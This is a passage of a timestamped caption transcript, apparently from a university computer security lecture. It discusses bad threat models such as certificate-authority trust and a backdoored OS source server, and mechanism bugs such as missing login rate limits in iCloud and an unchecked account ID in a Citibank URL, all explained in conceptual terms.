              <text_slice>you might realize that you
shouldn't trust hardware even</text_slice>
            </slice>
            <slice>
              <time_slice>25:12</time_slice>
              <text_slice>these days, right?</text_slice>
            </slice>
            <slice>
              <time_slice>25:13</time_slice>
              <text_slice>There was all these
revelations about what</text_slice>
            </slice>
            <slice>
              <time_slice>25:14</time_slice>
              <text_slice>the NSA is capable of doing.</text_slice>
            </slice>
            <slice>
              <time_slice>25:16</time_slice>
              <text_slice>And they have
hardware back doors</text_slice>
            </slice>
            <slice>
              <time_slice>25:18</time_slice>
              <text_slice>that they can insert
into computers.</text_slice>
            </slice>
            <slice>
              <time_slice>25:20</time_slice>
              <text_slice>And maybe up until a couple
years ago, well, who knows?</text_slice>
            </slice>
            <slice>
              <time_slice>25:23</time_slice>
              <text_slice>I guess we didn't
know about this stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>25:25</time_slice>
              <text_slice>So maybe it was a
reasonable assumption</text_slice>
            </slice>
            <slice>
              <time_slice>25:27</time_slice>
              <text_slice>to assume your
laptop is not going</text_slice>
            </slice>
            <slice>
              <time_slice>25:29</time_slice>
              <text_slice>to be compromised physically,
the hardware itself.</text_slice>
            </slice>
            <slice>
              <time_slice>25:31</time_slice>
              <text_slice>But now you know.</text_slice>
            </slice>
            <slice>
              <time_slice>25:32</time_slice>
              <text_slice>Actually, if you're worried
about the government</text_slice>
            </slice>
            <slice>
              <time_slice>25:34</time_slice>
              <text_slice>being after you, you probably
have a much harder problem</text_slice>
            </slice>
            <slice>
              <time_slice>25:37</time_slice>
              <text_slice>to deal with because
your laptop might</text_slice>
            </slice>
            <slice>
              <time_slice>25:39</time_slice>
              <text_slice>be compromised
physically, regardless</text_slice>
            </slice>
            <slice>
              <time_slice>25:40</time_slice>
              <text_slice>of what you install in it.</text_slice>
            </slice>
            <slice>
              <time_slice>25:42</time_slice>
              <text_slice>So we really have to be
careful with your threat model</text_slice>
            </slice>
            <slice>
              <time_slice>25:44</time_slice>
              <text_slice>and really sort of
balance it against who</text_slice>
            </slice>
            <slice>
              <time_slice>25:46</time_slice>
              <text_slice>you think is out to get you.</text_slice>
            </slice>
            <slice>
              <time_slice>25:48</time_slice>
              <text_slice>I think it's going to be a very
expensive proposition if you're</text_slice>
            </slice>
            <slice>
              <time_slice>25:50</time_slice>
              <text_slice>going to try to protect
yourself from the NSA, really.</text_slice>
            </slice>
            <slice>
              <time_slice>25:53</time_slice>
              <text_slice>On the other hand, if you're
just protecting yourself</text_slice>
            </slice>
            <slice>
              <time_slice>25:55</time_slice>
              <text_slice>from random other
students that are,</text_slice>
            </slice>
            <slice>
              <time_slice>25:57</time_slice>
              <text_slice>I don't know, snooping around
in your Athena home directory</text_slice>
            </slice>
            <slice>
              <time_slice>26:00</time_slice>
              <text_slice>or whatnot, maybe you
don't have to worry</text_slice>
            </slice>
            <slice>
              <time_slice>26:01</time_slice>
              <text_slice>about this stuff as much.</text_slice>
            </slice>
            <slice>
              <time_slice>26:03</time_slice>
              <text_slice>So it's really a balancing game
and picking the right threat</text_slice>
            </slice>
            <slice>
              <time_slice>26:06</time_slice>
              <text_slice>model.</text_slice>
            </slice>
            <slice>
              <time_slice>26:08</time_slice>
              <text_slice>Another example of a bad threat
model shows up in the way</text_slice>
            </slice>
            <slice>
              <time_slice>26:15</time_slice>
              <text_slice>secure websites these days
check certificates of a website</text_slice>
            </slice>
            <slice>
              <time_slice>26:18</time_slice>
              <text_slice>that you're connecting to.</text_slice>
            </slice>
            <slice>
              <time_slice>26:19</time_slice>
              <text_slice>So in this SSL protocol or TLS,
when you connect to a website</text_slice>
            </slice>
            <slice>
              <time_slice>26:23</time_slice>
              <text_slice>and it says HTTPS-- we'll
talk much more about this</text_slice>
            </slice>
            <slice>
              <time_slice>26:25</time_slice>
              <text_slice>in later lectures--
but what happens</text_slice>
            </slice>
            <slice>
              <time_slice>26:28</time_slice>
              <text_slice>is that the site you're
connecting to presents you</text_slice>
            </slice>
            <slice>
              <time_slice>26:30</time_slice>
              <text_slice>a certificate signed by one
of the certificate authorities</text_slice>
            </slice>
            <slice>
              <time_slice>26:34</time_slice>
              <text_slice>out there that attests
that, yep, this key</text_slice>
            </slice>
            <slice>
              <time_slice>26:37</time_slice>
              <text_slice>belongs to Amazon.com.</text_slice>
            </slice>
            <slice>
              <time_slice>26:39</time_slice>
              <text_slice>And architecturally,
the sort of mistake</text_slice>
            </slice>
            <slice>
              <time_slice>26:42</time_slice>
              <text_slice>or the bad threat model
that these guys assumed</text_slice>
            </slice>
            <slice>
              <time_slice>26:46</time_slice>
              <text_slice>is that all these CAs are
going to be trustworthy.</text_slice>
            </slice>
            <slice>
              <time_slice>26:49</time_slice>
              <text_slice>They will never make a mistake.</text_slice>
            </slice>
            <slice>
              <time_slice>26:50</time_slice>
              <text_slice>And in fact, the
way system works</text_slice>
            </slice>
            <slice>
              <time_slice>26:52</time_slice>
              <text_slice>is that there's hundreds
of these CAs out there.</text_slice>
            </slice>
            <slice>
              <time_slice>26:54</time_slice>
              <text_slice>The Indian postal authority,
I think, has a CA.</text_slice>
            </slice>
            <slice>
              <time_slice>26:58</time_slice>
              <text_slice>The Chinese government has a CA.</text_slice>
            </slice>
            <slice>
              <time_slice>27:00</time_slice>
              <text_slice>Lots of entities are certificate
authorities in this design.</text_slice>
            </slice>
            <slice>
              <time_slice>27:04</time_slice>
              <text_slice>And any of them can
make a certificate</text_slice>
            </slice>
            <slice>
              <time_slice>27:06</time_slice>
              <text_slice>for any host name
or a domain name.</text_slice>
            </slice>
            <slice>
              <time_slice>27:09</time_slice>
              <text_slice>And as a result, what
happens if you're a bad guy,</text_slice>
            </slice>
            <slice>
              <time_slice>27:11</time_slice>
              <text_slice>if you want to compromise Gmail
or if you want to impersonate</text_slice>
            </slice>
            <slice>
              <time_slice>27:14</time_slice>
              <text_slice>Gmail's website, you
just have to compromise</text_slice>
            </slice>
            <slice>
              <time_slice>27:16</time_slice>
              <text_slice>one of these
certificate authorities.</text_slice>
            </slice>
            <slice>
              <time_slice>27:18</time_slice>
              <text_slice>And it turns out the
weakest link is probably</text_slice>
            </slice>
            <slice>
              <time_slice>27:20</time_slice>
              <text_slice>some poorly run authority
somewhere in some,</text_slice>
            </slice>
            <slice>
              <time_slice>27:23</time_slice>
              <text_slice>you know, not particularly
up to date country.</text_slice>
            </slice>
            <slice>
              <time_slice>27:26</time_slice>
              <text_slice>Who knows, right?</text_slice>
            </slice>
            <slice>
              <time_slice>27:27</time_slice>
              <text_slice>And as a result, it's
probably a bad assumption</text_slice>
            </slice>
            <slice>
              <time_slice>27:31</time_slice>
              <text_slice>to build a system--
or it's a bad idea</text_slice>
            </slice>
            <slice>
              <time_slice>27:33</time_slice>
              <text_slice>to build a system
around the assumption</text_slice>
            </slice>
            <slice>
              <time_slice>27:34</time_slice>
              <text_slice>that you'll manage to
keep all 300 certificate</text_slice>
            </slice>
            <slice>
              <time_slice>27:38</time_slice>
              <text_slice>authorities spread out around
the globe perfectly secure.</text_slice>
            </slice>
            <slice>
              <time_slice>27:42</time_slice>
              <text_slice>But yet, that's the
assumption underpinning</text_slice>
            </slice>
            <slice>
              <time_slice>27:44</time_slice>
              <text_slice>the security mechanism of
today's SSL protocol used</text_slice>
            </slice>
            <slice>
              <time_slice>27:49</time_slice>
              <text_slice>by web browsers.</text_slice>
            </slice>
            <slice>
              <time_slice>27:51</time_slice>
              <text_slice>And there's sort of many
other, I guess, examples</text_slice>
            </slice>
            <slice>
              <time_slice>27:56</time_slice>
              <text_slice>that are things you might
not have thought of.</text_slice>
            </slice>
            <slice>
              <time_slice>27:58</time_slice>
              <text_slice>Another sort of amusing example
from the 1980s was DARPA.</text_slice>
            </slice>
            <slice>
              <time_slice>28:04</time_slice>
              <text_slice>This defense
agency, at the time,</text_slice>
            </slice>
            <slice>
              <time_slice>28:07</time_slice>
              <text_slice>really wanted to build
secure operating systems.</text_slice>
            </slice>
            <slice>
              <time_slice>28:10</time_slice>
              <text_slice>And they actually
went so far as to get</text_slice>
            </slice>
            <slice>
              <time_slice>28:13</time_slice>
              <text_slice>a bunch of universities
and researchers</text_slice>
            </slice>
            <slice>
              <time_slice>28:15</time_slice>
              <text_slice>to build secure OS prototypes.</text_slice>
            </slice>
            <slice>
              <time_slice>28:17</time_slice>
              <text_slice>And then they actually
got a red team,</text_slice>
            </slice>
            <slice>
              <time_slice>28:19</time_slice>
              <text_slice>like a team of bad guys
pretending to be the attackers,</text_slice>
            </slice>
            <slice>
              <time_slice>28:23</time_slice>
              <text_slice>and told them, well, go break
into these secure operating</text_slice>
            </slice>
            <slice>
              <time_slice>28:25</time_slice>
              <text_slice>systems any way you can.</text_slice>
            </slice>
            <slice>
              <time_slice>28:26</time_slice>
              <text_slice>We actually want to
know, is it secure?</text_slice>
            </slice>
            <slice>
              <time_slice>28:29</time_slice>
              <text_slice>And it's kind of amusing,
some of the surprising ways</text_slice>
            </slice>
            <slice>
              <time_slice>28:32</time_slice>
              <text_slice>they compromised the systems.</text_slice>
            </slice>
            <slice>
              <time_slice>28:33</time_slice>
              <text_slice>One was that there
was this OS research</text_slice>
            </slice>
            <slice>
              <time_slice>28:36</time_slice>
              <text_slice>team that seemed to have
a perfectly secure OS,</text_slice>
            </slice>
            <slice>
              <time_slice>28:39</time_slice>
              <text_slice>but it got compromised.</text_slice>
            </slice>
            <slice>
              <time_slice>28:40</time_slice>
              <text_slice>And the way it happened is that
the server in which the source</text_slice>
            </slice>
            <slice>
              <time_slice>28:42</time_slice>
              <text_slice>code of the operating
system was stored</text_slice>
            </slice>
            <slice>
              <time_slice>28:44</time_slice>
              <text_slice>was some development
machine in someone's office</text_slice>
            </slice>
            <slice>
              <time_slice>28:46</time_slice>
              <text_slice>that wasn't secured at all.</text_slice>
            </slice>
            <slice>
              <time_slice>28:47</time_slice>
              <text_slice>But that had all
the source code.</text_slice>
            </slice>
            <slice>
              <time_slice>28:48</time_slice>
              <text_slice>So the bad guys broke
into that server.</text_slice>
            </slice>
            <slice>
              <time_slice>28:50</time_slice>
              <text_slice>It was not protected very well.</text_slice>
            </slice>
            <slice>
              <time_slice>28:51</time_slice>
              <text_slice>Changed the source code
of the operating system</text_slice>
            </slice>
            <slice>
              <time_slice>28:53</time_slice>
              <text_slice>to introduce a back door.</text_slice>
            </slice>
            <slice>
              <time_slice>28:54</time_slice>
              <text_slice>And then, when the researchers
built their operating systems,</text_slice>
            </slice>
            <slice>
              <time_slice>28:57</time_slice>
              <text_slice>well, it had this back door.</text_slice>
            </slice>
            <slice>
              <time_slice>28:59</time_slice>
              <text_slice>And the bad guys were
able to break in.</text_slice>
            </slice>
            <slice>
              <time_slice>29:00</time_slice>
              <text_slice>So you really have to think
about all the possible sort</text_slice>
            </slice>
            <slice>
              <time_slice>29:03</time_slice>
              <text_slice>of assumptions
you're making about</text_slice>
            </slice>
            <slice>
              <time_slice>29:05</time_slice>
              <text_slice>where your software
is coming from,</text_slice>
            </slice>
            <slice>
              <time_slice>29:07</time_slice>
              <text_slice>about how the bad
guy can get in,</text_slice>
            </slice>
            <slice>
              <time_slice>29:09</time_slice>
              <text_slice>in order to make sure your
system is really secure.</text_slice>
            </slice>
            <slice>
              <time_slice>29:14</time_slice>
              <text_slice>And there's many other examples
in lecture notes, if you want.</text_slice>
            </slice>
            <slice>
              <time_slice>29:18</time_slice>
              <text_slice>So I'm using anecdotes.</text_slice>
            </slice>
            <slice>
              <time_slice>29:19</time_slice>
              <text_slice>You can page through those.</text_slice>
            </slice>
            <slice>
              <time_slice>29:23</time_slice>
              <text_slice>Probably the most pervasive
problem that shows up,</text_slice>
            </slice>
            <slice>
              <time_slice>29:28</time_slice>
              <text_slice>of course, is in
mechanisms, though.</text_slice>
            </slice>
            <slice>
              <time_slice>29:30</time_slice>
              <text_slice>And in part, it's
because mechanisms</text_slice>
            </slice>
            <slice>
              <time_slice>29:33</time_slice>
              <text_slice>are the most complicated
part of the story.</text_slice>
            </slice>
            <slice>
              <time_slice>29:35</time_slice>
              <text_slice>It's the entirety of all
the software and hardware</text_slice>
            </slice>
            <slice>
              <time_slice>29:39</time_slice>
              <text_slice>and all that sort
of system components</text_slice>
            </slice>
            <slice>
              <time_slice>29:41</time_slice>
              <text_slice>that make up what is trying to
enforce your security policy.</text_slice>
            </slice>
            <slice>
              <time_slice>29:45</time_slice>
              <text_slice>And there's no end of ways
in which mechanisms can fail.</text_slice>
            </slice>
            <slice>
              <time_slice>29:49</time_slice>
              <text_slice>And, partly as a result,
much of this class</text_slice>
            </slice>
            <slice>
              <time_slice>29:55</time_slice>
              <text_slice>will focus pretty
heavily on mechanisms</text_slice>
            </slice>
            <slice>
              <time_slice>29:57</time_slice>
              <text_slice>and how do you make
mechanisms that are secure,</text_slice>
            </slice>
            <slice>
              <time_slice>30:00</time_slice>
              <text_slice>that provide correct enforcement
of security policies.</text_slice>
            </slice>
            <slice>
              <time_slice>30:04</time_slice>
              <text_slice>And we'll talk about threat
models and policies as well.</text_slice>
            </slice>
            <slice>
              <time_slice>30:06</time_slice>
              <text_slice>But turns out it's much
easier to make clean,</text_slice>
            </slice>
            <slice>
              <time_slice>30:12</time_slice>
              <text_slice>sort of crisp statements
about mechanisms and ways</text_slice>
            </slice>
            <slice>
              <time_slice>30:14</time_slice>
              <text_slice>they work and don't work, as
opposed to policies and threat</text_slice>
            </slice>
            <slice>
              <time_slice>30:18</time_slice>
              <text_slice>models which, really,
you have to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>30:20</time_slice>
              <text_slice>how to fit them into
a particular context</text_slice>
            </slice>
            <slice>
              <time_slice>30:22</time_slice>
              <text_slice>where you're using a system.</text_slice>
            </slice>
            <slice>
              <time_slice>30:24</time_slice>
              <text_slice>So let's look at some examples
of, I guess, mechanism bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>30:30</time_slice>
              <text_slice>One that you might have heard
in the last couple of days</text_slice>
            </slice>
            <slice>
              <time_slice>30:33</time_slice>
              <text_slice>was a problem in the security
mechanism in Apple's cloud</text_slice>
            </slice>
            <slice>
              <time_slice>30:38</time_slice>
              <text_slice>infrastructure called iCloud.</text_slice>
            </slice>
            <slice>
              <time_slice>30:42</time_slice>
              <text_slice>Well actually, any one
of you that has an iPhone</text_slice>
            </slice>
            <slice>
              <time_slice>30:45</time_slice>
              <text_slice>might be using this
iCloud service.</text_slice>
            </slice>
            <slice>
              <time_slice>30:47</time_slice>
              <text_slice>They basically provide
storage for files</text_slice>
            </slice>
            <slice>
              <time_slice>30:49</time_slice>
              <text_slice>and let you find your iPhone
if you lose it, and probably</text_slice>
            </slice>
            <slice>
              <time_slice>30:53</time_slice>
              <text_slice>lots of other useful features.</text_slice>
            </slice>
            <slice>
              <time_slice>30:55</time_slice>
              <text_slice>And I think it's some relative
of this me.com service</text_slice>
            </slice>
            <slice>
              <time_slice>30:58</time_slice>
              <text_slice>that was implicated in this
scheme a couple years back.</text_slice>
            </slice>
            <slice>
              <time_slice>31:03</time_slice>
              <text_slice>And the problem that
someone discovered</text_slice>
            </slice>
            <slice>
              <time_slice>31:04</time_slice>
              <text_slice>in this iCloud
service is that they</text_slice>
            </slice>
            <slice>
              <time_slice>31:08</time_slice>
              <text_slice>didn't enforce the same sort
of mechanism at all interfaces.</text_slice>
            </slice>
            <slice>
              <time_slice>31:11</time_slice>
              <text_slice>OK, so what does
iCloud look like?</text_slice>
            </slice>
            <slice>
              <time_slice>31:13</time_slice>
              <text_slice>Well, it basically provides lots
of services for the same sort</text_slice>
            </slice>
            <slice>
              <time_slice>31:18</time_slice>
              <text_slice>of set of accounts.</text_slice>
            </slice>
            <slice>
              <time_slice>31:19</time_slice>
              <text_slice>So maybe you have your
file storage on iCloud.</text_slice>
            </slice>
            <slice>
              <time_slice>31:23</time_slice>
              <text_slice>Maybe you have
your photo sharing.</text_slice>
            </slice>
            <slice>
              <time_slice>31:26</time_slice>
              <text_slice>Maybe you have other interfaces.</text_slice>
            </slice>
            <slice>
              <time_slice>31:27</time_slice>
              <text_slice>And one of the
interfaces into iCloud--</text_slice>
            </slice>
            <slice>
              <time_slice>31:28</time_slice>
              <text_slice>these are all sort
of at different APIs</text_slice>
            </slice>
            <slice>
              <time_slice>31:30</time_slice>
              <text_slice>that they provide-- was this
feature to find my iPhone,</text_slice>
            </slice>
            <slice>
              <time_slice>31:35</time_slice>
              <text_slice>I think.</text_slice>
            </slice>
            <slice>
              <time_slice>31:36</time_slice>
              <text_slice>And all these interfaces
want to make sure</text_slice>
            </slice>
            <slice>
              <time_slice>31:39</time_slice>
              <text_slice>that you are the right user,
you're authenticated correctly.</text_slice>
            </slice>
            <slice>
              <time_slice>31:42</time_slice>
              <text_slice>And unfortunately,
the developers</text_slice>
            </slice>
            <slice>
              <time_slice>31:45</time_slice>
              <text_slice>all this iCloud system, you know
it's a giant piece of software.</text_slice>
            </slice>
            <slice>
              <time_slice>31:48</time_slice>
              <text_slice>I'm sure lots of
developers worked on this.</text_slice>
            </slice>
            <slice>
              <time_slice>31:51</time_slice>
              <text_slice>But on this
particular interface,</text_slice>
            </slice>
            <slice>
              <time_slice>31:53</time_slice>
              <text_slice>the find my iPhone
interface, when</text_slice>
            </slice>
            <slice>
              <time_slice>31:55</time_slice>
              <text_slice>you tried to log in with
a username and password,</text_slice>
            </slice>
            <slice>
              <time_slice>31:58</time_slice>
              <text_slice>they didn't keep track of how
many times you tried to log in.</text_slice>
            </slice>
            <slice>
              <time_slice>32:02</time_slice>
              <text_slice>And the reason is important is
that, as I mentioned earlier,</text_slice>
            </slice>
            <slice>
              <time_slice>32:05</time_slice>
              <text_slice>humans are not that great
at picking good passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>32:07</time_slice>
              <text_slice>So actually building a system
that authenticates users</text_slice>
            </slice>
            <slice>
              <time_slice>32:10</time_slice>
              <text_slice>with passwords is pretty tricky.</text_slice>
            </slice>
            <slice>
              <time_slice>32:12</time_slice>
              <text_slice>We'll actually read a whole
paper about this later on.</text_slice>
            </slice>
            <slice>
              <time_slice>32:14</time_slice>
              <text_slice>But one good strategy
is, there's probably</text_slice>
            </slice>
            <slice>
              <time_slice>32:19</time_slice>
              <text_slice>a million passwords out
there that will account</text_slice>
            </slice>
            <slice>
              <time_slice>32:22</time_slice>
              <text_slice>for 50% percent of accounts.</text_slice>
            </slice>
            <slice>
              <time_slice>32:24</time_slice>
              <text_slice>So if you can guess,
make a million attempts</text_slice>
            </slice>
            <slice>
              <time_slice>32:26</time_slice>
              <text_slice>at someone's
account, then there's</text_slice>
            </slice>
            <slice>
              <time_slice>32:28</time_slice>
              <text_slice>a good chance you'll get
their password because people</text_slice>
            </slice>
            <slice>
              <time_slice>32:31</time_slice>
              <text_slice>actually pick
predictable passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>32:33</time_slice>
              <text_slice>And one way to
try to defeat this</text_slice>
            </slice>
            <slice>
              <time_slice>32:34</time_slice>
              <text_slice>is to make sure that
your system doesn't</text_slice>
            </slice>
            <slice>
              <time_slice>32:36</time_slice>
              <text_slice>allow an arbitrary
number of attempts</text_slice>
            </slice>
            <slice>
              <time_slice>32:38</time_slice>
              <text_slice>to log in to an account.</text_slice>
            </slice>
            <slice>
              <time_slice>32:39</time_slice>
              <text_slice>Maybe after three
or 10 tries, you</text_slice>
            </slice>
            <slice>
              <time_slice>32:42</time_slice>
              <text_slice>should say, well,
you've had enough tries.</text_slice>
            </slice>
            <slice>
              <time_slice>32:44</time_slice>
              <text_slice>Time out.</text_slice>
            </slice>
            <slice>
              <time_slice>32:45</time_slice>
              <text_slice>You can try again in 10
minutes or in an hour.</text_slice>
            </slice>
            <slice>
              <time_slice>32:48</time_slice>
              <text_slice>And this way you really
slow down the attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>32:50</time_slice>
              <text_slice>So they can only make a
handful of guesses a day,</text_slice>
            </slice>
            <slice>
              <time_slice>32:54</time_slice>
              <text_slice>instead of millions of guesses.</text_slice>
            </slice>
            <slice>
              <time_slice>32:56</time_slice>
              <text_slice>And as a result, even if
you have not the greatest</text_slice>
            </slice>
            <slice>
              <time_slice>32:58</time_slice>
              <text_slice>of passwords, it's going to
be pretty hard for someone</text_slice>
            </slice>
            <slice>
              <time_slice>33:00</time_slice>
              <text_slice>to guess it.</text_slice>
            </slice>
            <slice>
              <time_slice>33:01</time_slice>
              <text_slice>What would happen is that iCloud
had this password guessing</text_slice>
            </slice>
            <slice>
              <time_slice>33:06</time_slice>
              <text_slice>prevention or, basically,
back off, on some interfaces,</text_slice>
            </slice>
            <slice>
              <time_slice>33:10</time_slice>
              <text_slice>like if you tried to log
in through other interfaces</text_slice>
            </slice>
            <slice>
              <time_slice>33:12</time_slice>
              <text_slice>and you failed 10 times,
it would say, well, sorry.</text_slice>
            </slice>
            <slice>
              <time_slice>33:15</time_slice>
              <text_slice>You have to wait
until you try again.</text_slice>
            </slice>
            <slice>
              <time_slice>33:17</time_slice>
              <text_slice>But on this find my
iPhone interface,</text_slice>
            </slice>
            <slice>
              <time_slice>33:18</time_slice>
              <text_slice>they forget this check.</text_slice>
            </slice>
            <slice>
              <time_slice>33:19</time_slice>
              <text_slice>That's probably, you
know, some guy just</text_slice>
            </slice>
            <slice>
              <time_slice>33:21</time_slice>
              <text_slice>forgot to call this
function on this API.</text_slice>
            </slice>
            <slice>
              <time_slice>33:23</time_slice>
              <text_slice>But the result is that, for
the same set of accounts,</text_slice>
            </slice>
            <slice>
              <time_slice>33:26</time_slice>
              <text_slice>a bad guy would be able
to now guess your password</text_slice>
            </slice>
            <slice>
              <time_slice>33:28</time_slice>
              <text_slice>through this interface at
millions of attempts per day</text_slice>
            </slice>
            <slice>
              <time_slice>33:32</time_slice>
              <text_slice>easily, because this is just
limited up to how fast they</text_slice>
            </slice>
            <slice>
              <time_slice>33:35</time_slice>
              <text_slice>can send packets to
this iCloud thing.</text_slice>
            </slice>
            <slice>
              <time_slice>33:37</time_slice>
              <text_slice>And they can probably
guess your password</text_slice>
            </slice>
            <slice>
              <time_slice>33:39</time_slice>
              <text_slice>with pretty good accuracy, or
with pretty good success rate,</text_slice>
            </slice>
            <slice>
              <time_slice>33:43</time_slice>
              <text_slice>after making many guesses.</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>And this led to some
unfortunate break ins.</text_slice>
            </slice>
            <slice>
              <time_slice>33:48</time_slice>
              <text_slice>And people's confidential
data got stolen</text_slice>
            </slice>
            <slice>
              <time_slice>33:51</time_slice>
              <text_slice>from this iCloud service.</text_slice>
            </slice>
            <slice>
              <time_slice>33:54</time_slice>
              <text_slice>So this is sort of an example
of you had the right policy.</text_slice>
            </slice>
            <slice>
              <time_slice>33:59</time_slice>
              <text_slice>Only the user and
the right password</text_slice>
            </slice>
            <slice>
              <time_slice>34:01</time_slice>
              <text_slice>would get you
access to the files.</text_slice>
            </slice>
            <slice>
              <time_slice>34:02</time_slice>
              <text_slice>You even had the
right threat model</text_slice>
            </slice>
            <slice>
              <time_slice>34:04</time_slice>
              <text_slice>that, well, the bad guy might
be able to guess the password.</text_slice>
            </slice>
            <slice>
              <time_slice>34:06</time_slice>
              <text_slice>So we'll have to break limit
the number of guess attempts.</text_slice>
            </slice>
            <slice>
              <time_slice>34:09</time_slice>
              <text_slice>But he just screwed up, like
the mechanism had a bug in it.</text_slice>
            </slice>
            <slice>
              <time_slice>34:12</time_slice>
              <text_slice>He just forgot to enforce this
right policy and mechanism</text_slice>
            </slice>
            <slice>
              <time_slice>34:15</time_slice>
              <text_slice>at some interface.</text_slice>
            </slice>
            <slice>
              <time_slice>34:16</time_slice>
              <text_slice>And this shows up again
and again in systems,</text_slice>
            </slice>
            <slice>
              <time_slice>34:19</time_slice>
              <text_slice>where just made a mistake and
it has pretty drastic effects</text_slice>
            </slice>
            <slice>
              <time_slice>34:24</time_slice>
              <text_slice>on the security of
the overall system.</text_slice>
            </slice>
            <slice>
              <time_slice>34:27</time_slice>
              <text_slice>This make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>34:28</time_slice>
              <text_slice>Any questions so far?</text_slice>
            </slice>
            <slice>
              <time_slice>34:33</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>34:34</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>34:35</time_slice>
              <text_slice>So another example-- this
is sort of an example of you</text_slice>
            </slice>
            <slice>
              <time_slice>34:39</time_slice>
              <text_slice>forget to check for
password guessing attempts.</text_slice>
            </slice>
            <slice>
              <time_slice>34:42</time_slice>
              <text_slice>There's many other
things you can forget.</text_slice>
            </slice>
            <slice>
              <time_slice>34:44</time_slice>
              <text_slice>You could forget to check for
access control altogether.</text_slice>
            </slice>
            <slice>
              <time_slice>34:47</time_slice>
              <text_slice>So one example is, Citibank
had a website-- actually, still</text_slice>
            </slice>
            <slice>
              <time_slice>34:53</time_slice>
              <text_slice>has a website that allows you
to look at your credit card</text_slice>
            </slice>
            <slice>
              <time_slice>34:57</time_slice>
              <text_slice>account information.</text_slice>
            </slice>
            <slice>
              <time_slice>34:58</time_slice>
              <text_slice>So if you have a credit
card with Citibank,</text_slice>
            </slice>
            <slice>
              <time_slice>34:59</time_slice>
              <text_slice>you go to this
website, it tells you,</text_slice>
            </slice>
            <slice>
              <time_slice>35:00</time_slice>
              <text_slice>yeah, you have this credit card.</text_slice>
            </slice>
            <slice>
              <time_slice>35:01</time_slice>
              <text_slice>Here's all the charges,
all this great stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>35:04</time_slice>
              <text_slice>And the workflow a couple
of years ago was that you go</text_slice>
            </slice>
            <slice>
              <time_slice>35:08</time_slice>
              <text_slice>to some site, you provide a
log in username and password,</text_slice>
            </slice>
            <slice>
              <time_slice>35:12</time_slice>
              <text_slice>and you get redirected
to another URL,</text_slice>
            </slice>
            <slice>
              <time_slice>35:15</time_slice>
              <text_slice>which is something like, I
don't know, I'm guessing,</text_slice>
            </slice>
            <slice>
              <time_slice>35:18</time_slice>
              <text_slice>but basically like
citi.com/account?id= you know,</text_slice>
            </slice>
            <slice>
              <time_slice>35:23</time_slice>
              <text_slice>whatever, one two three four.</text_slice>
            </slice>
            <slice>
              <time_slice>35:26</time_slice>
              <text_slice>And it turns out that some
guy figured out, well,</text_slice>
            </slice>
            <slice>
              <time_slice>35:29</time_slice>
              <text_slice>if you change this
number, you just</text_slice>
            </slice>
            <slice>
              <time_slice>35:30</time_slice>
              <text_slice>get someone else's account.</text_slice>
            </slice>
            <slice>
              <time_slice>35:33</time_slice>
              <text_slice>And it's not clear quite
how to think of this.</text_slice>
            </slice>
            <slice>
              <time_slice>35:37</time_slice>
              <text_slice>One possibility is that these
guys were just thinking right,</text_slice>
            </slice>
            <slice>
              <time_slice>35:40</time_slice>
              <text_slice>but they, again, forgot to
check a function in this account</text_slice>
            </slice>
            <slice>
              <time_slice>35:43</time_slice>
              <text_slice>page that, not only do I
have a valid ID number,</text_slice>
            </slice>
            <slice>
              <time_slice>35:46</time_slice>
              <text_slice>but it's also the ID
number of the guy that's</text_slice>
            </slice>
            <slice>
              <time_slice>35:48</time_slice>
              <text_slice>currently logged in.</text_slice>
            </slice>
            <slice>
              <time_slice>35:50</time_slice>
              <text_slice>It's an important check to me.</text_slice>
            </slice>
            <slice>
              <time_slice>35:51</time_slice>
              <text_slice>But it's easy to forget.</text_slice>
            </slice>
            <slice>
              <time_slice>35:53</time_slice>
              <text_slice>Another thing is, maybe
these guys were thinking,</text_slice>
            </slice>
            <slice>
              <time_slice>35:55</time_slice>
              <text_slice>no, no one could hit URLs.</text_slice>
            </slice>
            <slice>
              <time_slice>35:56</time_slice>
              <text_slice>Maybe they had a bad
threat model, right?</text_slice>
            </slice>
            <slice>
              <time_slice>35:58</time_slice>
              <text_slice>Maybe they're
thinking, the URL--</text_slice>
            </slice>
            <slice>
              <time_slice>36:00</time_slice>
              <text_slice>if I don't print this URL,
no one can click on it.</text_slice>
            </slice>
            <slice>
              <time_slice>36:02</time_slice>
              <text_slice>It's like a bad threat model.</text_slice>
            </slice>
            <slice>
              <time_slice>36:04</time_slice>
              <text_slice>So maybe that's-- well, it's
hard to tell exactly what went</text_slice>
            </slice>
            <slice>
              <time_slice>36:07</time_slice>
              <text_slice>wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>36:08</time_slice>
              <text_slice>But anyway, these
mistakes do happen.</text_slice>
            </slice>
            <slice>
              <time_slice>36:10</time_slice>
              <text_slice>And they show up a lot.</text_slice>
            </slice>
            <slice>
              <time_slice>36:12</time_slice>
              <text_slice>So easy to have
small, seemingly, bugs</text_slice>
            </slice>
            <slice>
              <time_slice>36:17</time_slice>
              <text_slice>in your mechanism lead to
pretty unfortunate consequences.</text_slice>
            </slice>
            <slice>
              <time_slice>36:24</time_slice>
              <text_slice>Another example that's not
so much in missing checks</text_slice>
            </slice>
            <slice>
              <time_slice>36:28</time_slice>
              <text_slice>is a problem that
showed up on Android</text_slice>
            </slice>
            <slice>
              <time_slice>36:30</time_slice>
              <text_slice>phones a couple of months ago.</text_slice>
            </slice>
            <slice>
              <time_slice>36:33</time_slice>
              <text_slice>Maybe I'll use this
board over here.</text_slice>
            </slice>
            <slice>
              <time_slice>36:38</time_slice>
              <text_slice>So the problem was related to
Bitcoin, which is this-- well,</text_slice>
            </slice>
            <slice>
              <time_slice>36:42</time_slice>
              <text_slice>I'm sure you've heard--
this electronic currency</text_slice>
            </slice>
            <slice>
              <time_slice>36:44</time_slice>
              <text_slice>system that's pretty
popular these days.</text_slice>
            </slice>
            <slice>
              <time_slice>36:47</time_slice>
              <text_slice>And the way that Bitcoin
works, at a very high level,</text_slice>
            </slice>
            <slice>
              <time_slice>36:54</time_slice>
